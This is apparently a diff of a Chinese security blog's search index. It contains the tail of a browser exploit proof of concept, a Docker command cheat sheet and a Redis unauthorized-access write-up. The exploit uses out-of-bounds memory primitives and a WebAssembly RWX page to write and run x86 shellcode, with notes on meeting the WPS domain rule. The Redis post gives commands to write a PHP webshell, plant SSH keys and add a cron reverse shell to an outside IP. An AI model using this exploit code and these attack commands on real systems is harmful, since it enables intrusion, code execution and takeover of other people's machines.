class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">set_32</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[bk_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bk_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dv.<span class="title function_">setUint32</span>(<span class="number">0</span>, val, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write8</span>(<span class="params">addr, val</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> r8 = <span class="title function_">d2u</span>(oob_array[bk_idx]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bk_idx_flag === <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(addr, r8[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">oob_array[bk_idx] = <span class="title function_">u2d</span>(r8[<span class="number">0</span>], addr);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">dv.<span class="title function_">setUint8</span>(<span class="number">0</span>, val);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> fake_length = <span class="title function_">get_32</span>(<span class="title function_">addrof</span>(oob_array)+<span class="number">12</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">set_32</span>(<span class="title function_">get_32</span>(<span class="title function_">addrof</span>(oob_array)+<span class="number">8</span>)+<span class="number">4</span>,fake_length);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span></span><br><span class="line"></span><br><span class="line">,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_mod);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> f = wasm_instance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> target_addr = <span class="title function_">addrof</span>(wasm_instance)+<span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> rwx_mem = <span class="title function_">get_32</span>(target_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//alert(&quot;rwx_mem is&quot;+rwx_mem.toString(16));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0xfc</span>, <span class="number">0xe8</span>, <span class="number">0x82</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x89</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xe5</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x64</span>, <span class="number">0x8b</span>, <span class="number">0x50</span>, <span class="number">0x30</span>,<span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x0c</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x14</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x28</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x26</span>, <span class="number">0x31</span>, <span class="number">0xff</span>,<span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0x52</span>,<span class="number">0x57</span>, <span class="number">0x8b</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x52</span>, <span class="number">0x10</span>, <span class="number">0x8b</span>, <span class="number">0x4a</span>, <span class="number">0x3c</span>, <span class="number">0x8b</span>, <span class="number">0x4c</span>, <span class="number">0x11</span>, <span class="number">0x78</span>, <span class="number">0xe3</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xd1</span>,<span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x49</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x3a</span>, <span class="number">0x49</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x8b</span>,<span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0xac</span>, <span class="number">0xc1</span>, <span class="number">0xcf</span>, <span class="number">0x0d</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf6</span>, <span class="number">0x03</span>,<span class="number">0x7d</span>, <span class="number">0xf8</span>, <span class="number">0x3b</span>, <span class="number">0x7d</span>, <span class="number">0x24</span>, <span class="number">0x75</span>, <span class="number">0xe4</span>, <span class="number">0x58</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0xd3</span>, <span class="number">0x66</span>, <span class="number">0x8b</span>,<span class="number">0x0c</span>, <span class="number">0x4b</span>, <span class="number">0x8b</span>, <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x01</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0xd3</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x8b</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x89</span>, <span class="number">0x44</span>, <span class="number">0x24</span>,<span class="number">0x24</span>, <span class="number">0x5b</span>, <span class="number">0x5b</span>, <span class="number">0x61</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x51</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x5f</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xeb</span>,<span class="number">0x8d</span>, <span class="number">0x5d</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x01</span>, <span class="number">0x8d</span>, <span class="number">0x85</span>, <span class="number">0xb2</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x68</span>, <span class="number">0x31</span>, <span class="number">0x8b</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6f</span>,<span class="number">0x87</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0xbb</span>, <span class="number">0xe0</span>, <span class="number">0x1d</span>, <span class="number">0x2a</span>, <span class="number">0x0a</span>, <span class="number">0x68</span>, <span class="number">0xa6</span>, <span class="number">0x95</span>, <span class="number">0xbd</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x9d</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,<span class="number">0x3c</span>, <span class="number">0x06</span>, <span class="number">0x7c</span>, <span class="number">0x0a</span>, <span class="number">0x80</span>, <span class="number">0xfb</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0x05</span>, <span class="number">0xbb</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x13</span>, <span class="number">0x72</span>, <span class="number">0x6f</span>, <span class="number">0x6a</span>,<span class="number">0x00</span>, <span class="number">0x53</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x00</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;shellcode.<span class="property">length</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write8</span>(rwx_mem+i,shellcode[i]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>需要将在1.html当前路径下启动http server并监听80端口，修改hosts文件（测试写死的）</p>
+<p>127.0.0.1 <a href="http://clientweb.docer.wps.cn.cloudwps.cn/">clientweb.docer.wps.cn.cloudwps.cn</a></p>
+<p><a href="http://漏洞触发需让域名规则满足clientweb.docer.wps.cn/">漏洞触发需让域名规则满足clientweb.docer.wps.cn</a>.{xxxxx}wps.cn即可，cloudwps.cn和wps.cn没有任何关系。正常攻击，<a href="http://也可以使用clientweb.docer.wps.cn.hellowps.cn/">也可以使用clientweb.docer.wps.cn.hellowps.cn</a>.</p>
+<p><strong>说明</strong></p>
+<p><strong>资料搜集来源于互联网，仅做技术分享与hvv威胁情报预警，切勿用于违法行为。</strong></p>
+<h1 id="每日更新漏洞情报-一键三连加关注"><a href="#每日更新漏洞情报-一键三连加关注" class="headerlink" title="每日更新漏洞情报   一键三连加关注"></a>每日更新漏洞情报   一键三连加关注</h1><h1 id="微信公众号"><a href="#微信公众号" class="headerlink" title="微信公众号"></a>微信公众号</h1><p><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F15a7bed4-43b3-40c8-8d2f-cdf07b0e354c%2FUntitled.png?table=block&id=94f1ad77-b3ed-459f-9552-2bad08adf475&spaceId=c83b5e26-6112-4af3-b822-de3746064a99&name=Untitled.png&userId=31606ab3-eb91-448c-9776-acb1215f91c2&cache=v2" alt="Untitled"></p>
+</div></div></div>
+
+<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+]]></content>
+      <categories>
+        <category>hvv</category>
+        <category>rce</category>
+      </categories>
+      <tags>
+        <tag>hvv</tag>
+        <tag>rce</tag>
+        <tag>poc</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Docker使用参考</title>
+    <url>/2022/11/26/docker1/</url>
+    <content><![CDATA[<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>你好啊 </p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>吃了么,睡了么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>有拥抱么，有晚安么</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<h1 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h1><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
+</div></div><div class='timeline-item-content'><h6 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h6><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p>
+<p>描述: Docker 是一个用于开发、交付和运行应用程序的开放平台。 Docker 使您能够将应用程序与基础架构分开，以便 您可以快速交付软件。使用 Docker，您可以管理您的基础架构 以与管理应用程序相同的方式。通过利用 Docker 的 快速传送、测试和部署代码的方法，您可以 显著减少编写代码和在生产环境中运行代码之间的延迟。</p>
+</div></div></div>
+
+
+<h1 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h1><div class="timeline red"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
+</div></div><div class='timeline-item-content'><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker ps	列出正在运行的容器</span><br><span class="line">docker ps -a	列出所有容器</span><br><span class="line">docker ps -s	列出正在运行的容器 (带 CPU / 内存)</span><br><span class="line">docker images	列出所有镜像</span><br><span class="line">docker exec -it &lt;container&gt;  bash	连接到容器</span><br><span class="line">docker logs &lt;container&gt;	显示容器的控制台日志</span><br><span class="line">docker stop &lt;container&gt;	停止容器</span><br><span class="line">docker restart &lt;container&gt;	重启一个容器</span><br><span class="line">docker rm &lt;container&gt;	移除一个容器</span><br><span class="line">docker port &lt;container&gt;	显示容器的端口映射</span><br><span class="line">docker top &lt;container&gt;	列出进程</span><br><span class="line">docker kill &lt;container&gt;	杀死一个容器</span><br><span class="line"></span><br><span class="line">docker start nginx-server	开始</span><br><span class="line">docker stop nginx-server	停止</span><br><span class="line">docker restart nginx-server	重启</span><br><span class="line">docker pause nginx-server	暂停</span><br><span class="line">docker unpause nginx-server	取消暂停</span><br><span class="line">docker wait nginx-server	阻塞容器</span><br><span class="line">docker kill nginx-server	发送 SIGKILL</span><br><span class="line">docker attach nginx-server	连接到现有容器</span><br><span class="line">docker pull 镜像   从docker registry中拉取镜像</span><br><span class="line"></span><br><span class="line">docker ps	列出正在运行的容器</span><br><span class="line">docker ps -a	列出所有容器</span><br><span class="line">docker logs nginx-server	容器日志</span><br><span class="line">docker inspect nginx-server	检查容器</span><br><span class="line">docker events nginx-server	容器事件</span><br><span class="line">docker port nginx-server	公共端口</span><br><span class="line">docker top nginx-server	运行进程</span><br><span class="line">docker stats nginx-server	容器资源使用</span><br><span class="line">docker diff nginx-server	列出对容器所做的更改</span><br><span class="line"></span><br><span class="line">docker images	列出镜像</span><br><span class="line">docker rmi nginx	删除镜像</span><br><span class="line">docker load &lt; ubuntu.tar.gz	加载一个 tarred 存储库</span><br><span class="line">docker load --input ubuntu.tar	加载一个 tarred 存储库</span><br><span class="line">docker save busybox &gt; ubuntu.tar	将镜像保存到 tar 存档</span><br><span class="line">docker history	显示镜像的历史</span><br><span class="line">docker commit nginx	将容器另存为镜像。</span><br><span class="line">docker tag nginx eon01/nginx	标记镜像</span><br><span class="line">docker push eon01/nginx	推送镜像</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 docker/imagesname  -d后台允许，-p端口映射</span><br><span class="line">docker run -it ubuntu /bin/bash   -i交互式  -t终端</span><br><span class="line"></span><br><span class="line">docker exec id   shell command  容器执行命令</span><br><span class="line">docker exec -u root -it imagesname  /bin/bash</span><br><span class="line">docker exec -it 容器名称 sh  从正在运行的容器中打开一个shell </span><br><span class="line"></span><br><span class="line">docker ps -a 列出所有docker容器（包括停止的）</span><br><span class="line">docker start | stop 容器名称 启动或停止现有容器</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下载dockerfile，json文件</span><br><span class="line">docker build -t setname    编译镜像，设置名为setname</span><br><span class="line"></span><br><span class="line">更新源代码，重新编译，运行，删除旧容器才可以适用新容器</span><br><span class="line"></span><br><span class="line">删除容器</span><br><span class="line">docker ps 列出获取容器id</span><br><span class="line">docker stop id   停止容器</span><br><span class="line">docker rm id  停止容器后删除容器</span><br><span class="line">docker rm -f id 停止并且删除</span><br><span class="line">-----------------------------------------------------------</span><br><span class="line">docker ps -a  列出所有容器</span><br><span class="line">docker kill id 杀死运行中的容器</span><br><span class="line">docker images 列出docker镜像</span><br><span class="line">docker rmi id 删除镜像</span><br><span class="line">docker system prune  删除与容器无关镜像，容器，卷，网络</span><br><span class="line">docker system prune -a 删除任何停止的容器和所有未使用的图像（不仅仅是悬空的图像）</span><br><span class="line">rm -R /var/lib/docker   删除docker数据目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">docker容器移除后数据不会保存（持久化数据设置）</span><br><span class="line">docker volume create todo-db 创建数据库</span><br><span class="line">设置镜像不能运行，删除后开始设置</span><br><span class="line">docker run -dp 80:80 -v todo-db:/etc/todos images-name  运行时指定卷安装</span><br><span class="line">删除后启动，数据不会清除，</span><br><span class="line">docker volume inspect todo-db 查看卷信息，数据位置信息</span><br><span class="line"></span><br><span class="line">适用绑定挂载（持久化数据，可以控制确切挂载点，实时修改）</span><br><span class="line">docker run -dp 3000:3000 \</span><br><span class="line">     -w /app -v &quot;$(pwd):/app&quot; \</span><br><span class="line">     node:12-alpine \</span><br><span class="line">-w 指定工作目录</span><br><span class="line">-v 将容器种主机当前目录挂载到工作目录</span><br><span class="line"></span><br><span class="line">docker logs -f 容器名称     获取并查看容器日志</span><br></pre></td></tr></table></figure>
+
+</div></div></div>
+
+<div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2022</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-26</p>
+</div></div><div class='timeline-item-content'><h6 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h6><p><a href="https://docs.docker.com/get-started/overview/">https://docs.docker.com/get-started/overview/</a><br><a href="https://quickref.cn/docs/docker.html">https://quickref.cn/docs/docker.html</a></p>
+</div></div></div>
+
+
+
+
+<h1 id="完结撒花"><a href="#完结撒花" class="headerlink" title="完结撒花"></a>完结撒花</h1><h2 id="积极向上"><a href="#积极向上" class="headerlink" title="积极向上"></a>积极向上</h2><h2 id="热爱生活"><a href="#热爱生活" class="headerlink" title="热爱生活"></a>热爱生活</h2><div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈 </p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
+</div>
+
+<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
+</div>
+
+
+]]></content>
+      <categories>
+        <category>tool</category>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>all</tag>
+        <tag>docker</tag>
+        <tag>tool</tag>
+        <tag>skill</tag>
       </tags>
   </entry>
   <entry>
@@ -581,67 +730,6 @@
         <tag>未授权访问</tag>
         <tag>漏洞复现</tag>
         <tag>MongoDB</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>redis 未授权访问</title>
-    <url>/2023/05/15/redis/</url>
-    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
-</div>
-
-<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
-</div>
-
-<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
-</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-15</p>
-</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
-<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Redis 在某些情况下，绑定在0.0.0.0 暴露公网访问的时候，没有防火墙策略，没有密码认证的情况下，会导致任意目标访问 redis 以及读取写入数据。</p>
-<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
-<li>绑定在 0.0.0.0:6379，没有安全策略ip限制，直接暴露在公网</li>
-<li>没有设置 redis 密码认证，可以免密码登陆</li>
-<li>高级利用，root 身份运行</li>
-</ul>
-<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
-<li>centos 7</li>
-<li>redis <code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis</span><br><span class="line">make</span><br><span class="line">make install 将redis-cli redis-server 安装到/usr/bin</span><br><span class="line"><span class="built_in">cp</span> redis.conf /etc</span><br><span class="line">修改redis.conf 配置文件 <span class="built_in">bind</span> 0.0.0.0,关闭密码认证，关闭服务器防火墙</span><br><span class="line">root启动</span><br></pre></td></tr></table></figure>
-
-<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">安装 redis-cli</span><br><span class="line">yay -S redis</span><br><span class="line">redis-cli -h 192.168.56.110  连接redis</span><br><span class="line"></span><br><span class="line">**数据泄漏**</span><br><span class="line">keys *   获取所有 keys 值</span><br><span class="line"></span><br><span class="line">**系统信息**</span><br><span class="line">info    获取系统信息，redis版本，系统信息等</span><br><span class="line"></span><br><span class="line">**webshell**</span><br><span class="line"><span class="comment"># 写入一个string内容</span></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n&lt;?=`<span class="variable">$_GET</span>[0]`?&gt;\n\n&quot;</span>    \n换行，防止写入数据混乱</span><br><span class="line"><span class="comment"># 设置备份目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line"><span class="comment"># 设置备份文件名</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="comment"># 保存文件到本地</span></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入 SSH 公钥登陆无密码登陆目标系统**</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa　　//执行生成key命令</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备份文件目录设置为对应的 .ssh，一般默认为 /root/.ssh/</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存key的时候加上两个`\n`是为了避免和Redis里其他缓存数据混合</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> key <span class="string">&quot;\n\n\生成的公钥n\n&quot;</span></span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">**写入计划任务 crontab 运行命令，获取shell**</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> shell <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.110.141/4789 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h1 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>修复方式</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></h1><ul>
-<li>bind 127.0.0.1  只对本地开放</li>
-<li>requirepass password  设置密码认证</li>
-<li>修改默认端口</li>
-<li>设置防火墙规则</li>
-</ul>
-</div></div></div>
-
-<div class="note red icon-padding modern"><i class="note-icon fas fa-fan"></i><p>啊，再见了，再见了，哈</p>
-</div>
-
-<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>我们会再见的对么</p>
-</div>
-
-<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>再见你要幸福</p>
-</div>
-
-<div class="note purple icon-padding modern"><i class="note-icon far fa-hand-scissors"></i><p>燕子，燕子</p>
-</div>
-
-]]></content>
-      <categories>
-        <category>未授权访问</category>
-        <category>redis</category>
-      </categories>
-      <tags>
-        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
@@ -762,6 +850,67 @@
       </categories>
       <tags>
         <tag>邮件钓鱼</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>redis 未授权访问</title>
+    <url>/2023/05/15/redis/</url>
+    <content><![CDATA[<div class="note red icon-padding flat"><i class="note-icon fas fa-fan"></i><p>方糖的博客</p>
+</div>
+
+<div class="note orange icon-padding modern"><i class="note-icon fas fa-battery-half"></i><p>安全小技巧</p>
+</div>
+
+<div class="note blue icon-padding modern"><i class="note-icon fas fa-bullhorn"></i><p>新的一年快到了….</p>
+</div>
+
+<div class="note purple icon-padding flat"><i class="note-icon far fa-hand-scissors"></i><p>剪刀石头布,哈，我又赢了 </p>
+</div>
+
+<div class="timeline pink"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p>
+</div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>05-15</p>
+</div></div><div class='timeline-item-content'><p>永远新的开始啊</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Redis 在某些情况下，绑定在0.0.0.0 暴露公网访问的时候，没有防火墙策略，没有密码认证的情况下，会导致任意目标访问 redis 以及读取写入数据。</p>
+<h1 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h1><ul>
+<li>绑定在 0.0.0.0:6379，没有安全策略ip限制，直接暴露在公网</li>
+<li>没有设置 redis 密码认证，可以免密码登陆</li>
+<li>高级利用，root 身份运行</li>
+</ul>
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><ul>
+<li>centos 7</li>
+<li>redis <code>wget http://download.redis.io/releases/redis-4.0.8.tar.gz</code></li>
+</ul>
